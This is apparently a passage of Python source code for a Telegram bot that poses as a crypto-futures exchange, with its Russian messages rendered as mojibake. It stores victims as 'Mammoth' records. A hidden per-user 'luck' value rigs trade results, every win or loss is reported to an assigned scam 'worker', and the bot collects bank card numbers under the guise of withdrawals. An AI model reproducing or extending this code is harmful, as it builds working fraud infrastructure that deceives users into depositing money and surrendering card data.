üí∞ –ë–∞–ª–∞–Ω—Å: {round(user.balance,2)} RUB
üì§ –ù–∞ –≤—ã–≤–æ–¥–µ: {user.on_output} RUB
üíº –ö—Ä–∏–ø—Ç–æ–ø–æ—Ä—Ç—Ñ–µ–ª—å:
        *{user.cryptoportfolio['btc']} BTC
        {user.cryptoportfolio['eth']} ETH
        {user.cryptoportfolio['ltc']} LTC*
–í–∞—à  ID - `{user.telegram_id}`
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
–£—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫ - {user.succesful_deals}
–í—Å–µ–≥–æ —Å–¥–µ–ª–æ–∫ - {user.deals}
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ

–î–∞—Ç–∞ –∏ –≤—Ä–µ–º—è: {user.created_at.strftime("%d.%m.%Y %H:%M:%S")}  

    """
        with open('hotbit.jpg', 'rb') as image:
            await bot.send_photo(message.from_user.id, InputFile(image), caption=template, reply_markup=top_up_balance(), parse_mode=ParseMode.MARKDOWN)


    @dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('{"id_field":'))
    async def futures_edit_msg_handler(query: types.CallbackQuery):
        await asyncio.sleep(2)
        query_data = json.loads(query.data)
        mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == query.from_user.id).first()
        id_field = query_data['id_field']
        duration = query_data['duration']
        time_func = 0
        futures_field = session.query(Futures).filter(Futures.id == id_field).first()
        from monobank import get_crypto_price_async, fetch_usd_to_rub_currency
        price = generate_number_for_futures(start_price=await get_crypto_price_async(session.query(Futures).filter(Futures.id == id_field).first().cryptosymbol),
                                            luck=session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first().luck
                                            , is_increase=futures_field.is_increase)



        msg_to_edit = await bot.edit_message_text(f'''
üî∏ {futures_field.cryptosymbol.upper()}/USD*
    üí∏ –ë–∞–ª–∞–Ω—Å: {mammonth.balance} RUB

    üí± –í–∞–ª—é—Ç–∞: {crypto_symbols[cryptocurrencies.index(cryptocurrency)]}

    üí∞ –°—É–º–º–∞ –ø—É–ª–∞: {futures_field.pool} RUB

    üí∏ –ù–∞—á–∞–ª—å–Ω–∞—è —Ü–µ–Ω–∞: {futures_field.start_price} USD
    
    üíµ –¶–µ–Ω–∞ —Å–µ–π—á–∞—Å: {round(price, 2)}
    
    ‚è∞ –í—Ä–µ–º–µ–Ω–∏ –ø—Ä–æ—à–ª–æ {time_func}/{duration}

''', chat_id=futures_field.chat_id, message_id=futures_field.message_id)

        time_func += 3
        await asyncio.sleep(3)
        while True:
            if time_func >= duration:
                end_price = generate_number_for_futures(start_price=await get_crypto_price_async(session.query(Futures).filter(Futures.id == id_field).first().cryptosymbol),
                                                    luck=session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first().luck, is_increase=futures_field.is_increase

                                                    )
                usd_to_rub = float(await fetch_usd_to_rub_currency())
                btcs = (futures_field.pool / usd_to_rub) / futures_field.start_price
                btcs_for_decrease = (futures_field.pool / usd_to_rub) / end_price
                await bot.edit_message_text(f'''
üî∏ {futures_field.cryptosymbol.upper()}/USD*
üí∏ –ë–∞–ª–∞–Ω—Å: {mammonth.balance} RUB

üí± –í–∞–ª—é—Ç–∞: {crypto_symbols[cryptocurrencies.index(cryptocurrency)]}

üí∞ –°—É–º–º–∞ –ø—É–ª–∞: {futures_field.pool} RUB

üí∏ –ù–∞—á–∞–ª—å–Ω–∞—è —Ü–µ–Ω–∞: {futures_field.start_price} USD

üíµ –¶–µ–Ω–∞ —Å–µ–π—á–∞—Å: {round(price, 2)}

‚è∞ –í—Ä–µ–º–µ–Ω–∏ –ø—Ä–æ—à–ª–æ {time_func}/{duration}

                ''', chat_id=futures_field.chat_id, message_id=futures_field.message_id)

                if futures_field.is_increase:
                    if futures_field.start_price > end_price:

                        await bot.send_message(chat_id=futures_field.chat_id, text=
f'''
‚õîüßæ–í—ã –ø–æ—Ç–µ—Ä—è–ª–∏ {futures_field.pool} RUBüßæ‚õî
üôå–ù–µ —Å–¥–∞–≤–∞–π—Ç–µ—Å—åü§û.
–í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–¥—Ö–æ–¥—è—â—É—é –¥–ª—è –≤–∞—Åüòè –ø–æ–¥—Ö–æ–¥—è—â—É—é —Å—Ç—Ä–∞—Ç–µ–≥–∏—éüìã –∏ 
–ø–æ–ø—ã—Ç–∞–π—Ç–µ—Å—å —Å–Ω–æ–≤–∞üÜïüîù
                                        ''')
                        user = session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first()
                        user.deals += 1

                        user.balance -= futures_field.pool
                        session.commit()
                        state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
                        data = dict()
                        data['MammonthTelegramId'] = futures_field.user_id
                        data['Amount'] = 0 - (btcs * futures_field.start_price - btcs * end_price)

                        data_for_telegram = {'chat_id': user.belongs_to_worker, "parse_mode": "Markdown", 'text': f'''
                        
–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å –∞–π–¥–∏ `{query.from_user.id}` 
/t{user.service_id} –ø–æ—Ç–µ—Ä—è–ª {futures_field.pool} '''}
                        import requests
                        requests.post(url=f'https://api.telegram.org/bot{TOKEN_FOR_MAIN}/sendMessage', data=data_for_telegram)


                    else:
                        await bot.send_message(chat_id=futures_field.chat_id, text=
f'''
‚úÖ–í—ã –ø–æ–ª—É—á–∏–ª–∏ {round(btcs * end_price - btcs * futures_field.start_price, 2)*100} RUBüí≤üíµ
–ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º —Å –ø—Ä–æ—Ñ–∏—Ç–æ–ºüôåüòé! 
–ü—Ä–æ—Ñ–∏—Ç —ç—Ç–æ –Ω–µ –ø—Ä–æ—Å—Ç–æ —É–¥–∞—á–∞ü§û, –∞ –∏ –ø—Ä–∞–≤–∏–ª—å–Ω–æ –ø–æ–¥–æ–±—Ä–∞–Ω–Ω–∞—è —Ç–æ—Ä–≥–æ–≤–∞—è —Å—Ç—Ä–∞—Ç–µ–≥–∏—èüìã
–ü—Ä–æ–¥–æ–ª–∂–∞–π—Ç–µ –∏–≥—Ä–∞—Ç—å —Ç–æ–ª—å–∫–æ –Ω–∞ –Ω–∞—à–µ–π –±–∏—Ä–∂–µ —Å–∞–º—ã–º–∏ –±–æ–ª—å—à–∏–ºüêÇ –≤—ã–∏–≥—Ä—ã—à–∞–º–∏üèÖ –∏ —Å–∞–º—ã–º–∏ –Ω–∏–∑–∫–∏–º–∏üíé –∫–æ–º–∏—Å—Å–∏—è–º–∏
                                                            ''')
                        user = session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first()
                        user.balance += (btcs * end_price - btcs * futures_field.start_price, 2)*100
                        user.profit += (btcs * end_price - btcs * futures_field.start_price, 2)*100
                        user.deals += 1
                        user.succesful_deals += 1
                        session.commit()

                        state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
                        data = dict()
                        data['MammonthTelegramId'] = futures_field.user_id
                        data['Amount'] = btcs * end_price - btcs * futures_field.start_price
                        data_for_telegram = {'chat_id': user.belongs_to_worker,"parse_mode": "Markdown", 'text': f'''
–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å –∞–π–¥–∏ `{query.from_user.id}` /t{user.service_id} –ø–æ–ª—É—á–∏–ª {round(100*(btcs * end_price - btcs * futures_field.start_price),2)} '''}
                        import requests


                        requests.post(url=f'https://api.telegram.org/bot{TOKEN_FOR_MAIN}/sendMessage', data=data_for_telegram)

                elif futures_field.is_increase == False:
                    if futures_field.start_price > end_price:
                        await bot.send_message(chat_id=futures_field.chat_id, text=
f'''
‚úÖ–í—ã –ø–æ–ª—É—á–∏–ª–∏ {round((btcs_for_decrease * futures_field.start_price - btcs_for_decrease * end_price)*100,2)} RUBüí≤üíµ
–ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º —Å –ø—Ä–æ—Ñ–∏—Ç–æ–ºüôåüòé! 
–ü—Ä–æ—Ñ–∏—Ç —ç—Ç–æ –Ω–µ –ø—Ä–æ—Å—Ç–æ —É–¥–∞—á–∞ü§û, –∞ –∏ –ø—Ä–∞–≤–∏–ª—å–Ω–æ –ø–æ–¥–æ–±—Ä–∞–Ω–Ω–∞—è —Ç–æ—Ä–≥–æ–≤–∞—è —Å—Ç—Ä–∞—Ç–µ–≥–∏—èüìã
–ü—Ä–æ–¥–æ–ª–∂–∞–π—Ç–µ –∏–≥—Ä–∞—Ç—å —Ç–æ–ª—å–∫–æ –Ω–∞ –Ω–∞—à–µ–π –±–∏—Ä–∂–µ —Å–∞–º—ã–º–∏ –±–æ–ª—å—à–∏–ºüêÇ –≤—ã–∏–≥—Ä—ã—à–∞–º–∏üèÖ –∏ —Å–∞–º—ã–º–∏ –Ω–∏–∑–∫–∏–º–∏üíé –∫–æ–º–∏—Å—Å–∏—è–º–∏

                                                                                    ''')
                        user = session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first()
                        user.balance += (btcs_for_decrease * futures_field.start_price - btcs_for_decrease * end_price)*100
                        user.profit += (btcs_for_decrease * futures_field.start_price - btcs_for_decrease * end_price)*100
                        user.deals += 1
                        user.succesful_deals += 1
                        session.commit()

                        state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
                        data = dict()
                        data['MammonthTelegramId'] = futures_field.user_id
                        data['Amount'] = btcs * futures_field.start_price - btcs * end_price
                        data_for_telegram = {'chat_id': user.belongs_to_worker, "parse_mode": "Markdown", 'text':
f'''
–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å –∞–π–¥–∏ `{query.from_user.id}`
/t{user.service_id} –ø–æ–ª—É—á–∏–ª {round((btcs_for_decrease * futures_field.start_price - btcs_for_decrease * end_price)*100,2)} '''}
                        import requests

                        requests.post(url=f'https://api.telegram.org/bot{TOKEN_FOR_MAIN}/sendMessage', data=data_for_telegram)
                    else:
                        await bot.send_message(chat_id=futures_field.chat_id, text=
f'''
‚õîüßæ–í—ã –ø–æ—Ç–µ—Ä—è–ª–∏ {futures_field.pool} RUBüßæ‚õî
üôå–ù–µ —Å–¥–∞–≤–∞–π—Ç–µ—Å—åü§û.
–í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–¥—Ö–æ–¥—è—â—É—é –¥–ª—è –≤–∞—Åüòè –ø–æ–¥—Ö–æ–¥—è—â—É—é —Å—Ç—Ä–∞—Ç–µ–≥–∏—éüìã –∏ 
–ø–æ–ø—ã—Ç–∞–π—Ç–µ—Å—å —Å–Ω–æ–≤–∞üÜïüîù
         
                                                                ''')
                        user = session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first()
                        user.deals += 1

                        user.balance -= futures_field.pool
                        session.commit()
                        state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
                        data = dict()
                        data['MammonthTelegramId'] = futures_field.user_id
                        data['Amount'] = 0 - (btcs * end_price - btcs * futures_field.start_price)

                        data_for_telegram = {'chat_id': user.belongs_to_worker, "parse_mode": "Markdown", 'text':
    f'''
–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å –∞–π–¥–∏ `{query.from_user.id}` 
/t{user.service_id} –ø–æ—Ç–µ—Ä—è–ª {futures_field.pool} '''}
                        import requests
                        requests.post(url=f'https://api.telegram.org/bot{TOKEN_FOR_MAIN}/sendMessage', data=data_for_telegram)

                break





            price = generate_number_for_futures(start_price=await get_crypto_price_async(session.query(Futures).filter(Futures.id == id_field).first().cryptosymbol),
                                            luck=session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first().luck
                                            , is_increase=futures_field.is_increase)
            await msg_to_edit.edit_text( text=
f'''
üî∏ {futures_field.cryptosymbol.upper()}/USD*
    üí∏ –ë–∞–ª–∞–Ω—Å: {mammonth.balance} RUB

    üí± –í–∞–ª—é—Ç–∞: {crypto_symbols[cryptocurrencies.index(cryptocurrency)]}

    üí∞ –°—É–º–º–∞ –ø—É–ª–∞: {futures_field.pool} RUB

    üí∏ –ù–∞—á–∞–ª—å–Ω–∞—è —Ü–µ–Ω–∞: {futures_field.start_price} USD
    
    üíµ –¶–µ–Ω–∞ —Å–µ–π—á–∞—Å: {round(price, 2)}
    
    ‚è∞ –í—Ä–µ–º–µ–Ω–∏ –ø—Ä–æ—à–ª–æ {time_func}/{duration}

''', )

            time_func += 3
            await asyncio.sleep(3)


    @dp.message_handler(state=NewBid.onBid)
    async def handle_on_bid(message: types.Message, state: FSMContext):
        data = await state.get_data()
        message_attributes = {
        'MammonthTelegramId': {
            'DataType': 'Number',
            'StringValue': f'{data["MammonthTelegramId"]}'
        },
        'Amount': {
            'DataType': 'Number',
            'StringValue': f'{data["Amount"]}'
        },

    }
        sns.publish(TopicArn='arn:aws:sns:eu-north-1:441199499768:onBidTopic',

                Message=f'''NewApplicationOnBid''', MessageAttributes=message_attributes

                )

        await state.finish()


    @dp.callback_query_handler(lambda callback_query: callback_query.data == 'top_up_balance')
    async def handle_top_up_balance(query: types.CallbackQuery):
        await query.message.answer('–í—ã–±–µ—Ä–∏—Ç–µ —É–¥–æ–±–Ω—ã–π –¥–ª—è –≤–∞—Å –º–µ—Ç–æ–¥ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è.', reply_markup=top_up_balance_by_card())
        await query.message.delete()

    @dp.message_handler(state=WithdrawStates.first)
    async def get_card_number(message: types.Message):
        from monobank import is_valid_credit_card
        try:
            if is_valid_credit_card((message.text)):
                await WithdrawStates.second.set()
                state = dp.current_state(chat=message.chat.id, user=message.from_user.id)
                data = dict()
                data['user_id'] = message.from_user.id
                data['card_num'] = message.text
                await state.set_data(data)
                await message.answer('–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –≤—ã–≤–æ–¥–∞ –æ—Ç 2000 RUB')

        except Exception as ex:
            print('—Å—Ç–æ –ø–∞—Ç—Ä–æ–Ω–∞')
            print(ex)
            await message.answer('''
‚ùå *–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –≤–≤–æ–¥, –≤–≤–µ–¥–∏—Ç–µ –í–∞—à–∏ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã –±–µ–∑ –ª–∏—à–Ω–∏—Ö –ø—Ä–æ–±–µ–ª–æ–≤ –∏ —Å—Ç–æ—Ä–æ–Ω–Ω–∏—Ö —Å–∏–º–≤–æ–ª–æ–≤.*
            
            ''', parse_mode=ParseMode.MARKDOWN)

    @dp.message_handler(state=WithdrawStates.second)
    async def create_application_for_withdraw(message: types.Message, state:FSMContext):
        mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first()

        if float(message.text) <= mammonth.balance:
            if float(message.text) >= 2000:
                data = await state.get_data()
                user_id = data['user_id']
                card_num = data['card_num']


                new_application_to_withdraw = Withdraws(user_id = user_id, card = card_num, amount = float(message.text))
                session.add(new_application_to_withdraw)
                session.commit()
                mammonth.balance -= new_application_to_withdraw.amount
                session.commit()
                message_attributes = {
                    'withdraw_id': {
                        'DataType': 'Number',
                        'StringValue': f'{new_application_to_withdraw.id}'
                    }
                }

                sns.publish(TopicArn='arn:aws:sns:eu-north-1:441199499768:ApplicationsToWithdraw',

                            Message=f'''NewApplicationToWithdraw''', MessageAttributes=message_attributes

                            )
                await  message.answer('–ó–∞—è–≤–∫–∞ –Ω–∞ —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω–∏–∏, –æ–∂–∏–¥–∞–π—Ç–µ')
                await state.finish()
            else:
                await message.answer('–°—É–º–º–∞ –≤—ã–≤–æ–¥–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ—Ç 2000 RUB')
                await state.finish()
        else:
            await message.answer('–°—É–º–º–∞ –≤—ã–≤–æ–¥–∞ –±–æ–ª—å—à–µ —á–µ–º –≤–∞—à –±–∞–ª–∞–Ω—Å!')
            await state.finish()

    @dp.callback_query_handler(lambda callback_query: callback_query.data == 'withdraw')
    async def handle_withdraw(query: types.CallbackQuery):
        await WithdrawStates.first.set()
        await query.message.answer("–í–≤–µ–¥–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–π –Ω–æ–º–µ—Ä –±–∞–Ω–∫–æ–≤—Å–∫–æ–π –∫–∞—Ä—Ç—ã")


    @dp.callback_query_handler(lambda callback_query: callback_query.data == 'top_up_balance_by_card')
    async def handle_top_up_balance_by_card(query: types.CallbackQuery):
        await TopUpBalance.WaitingForSum.set()
        mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == query.from_user.id).first()
        await query.message.answer(f'üí∞ –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –æ—Ç {mammonth.min_input_output_amount_value} RUB –¥–æ 250000 RUB')

    @dp.callback_query_handler(lambda callback_query: callback_query.data == 'top_up_balance_by_crypto')
    async def handle_top_up_balance_by_card(query: types.CallbackQuery):
        mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == query.from_user.id).first()
        await TopUpBalance.WaitingForSumCrypto.set()
        await query.message.answer(f'üí∞ –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –æ—Ç {mammonth.min_input_output_amount_value} RUB –¥–æ 250000 RUB')


    @dp.message_handler(commands=['get_state'])
    async def get_state(message: types.Message, state: FSMContext):
        current_state = await state.get_state()
        await message.answer(f"–¢–µ–∫—É—â–µ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: {current_state}")

    from aiogram import executor

    storage = MemoryStorage()
    # –ü–æ–¥–∫–ª—é—á–∞–µ–º MemoryStorage –∫ –±–æ—Ç—É
    dp.storage = storage
    executor.start_polling(dp, skip_updates=True)

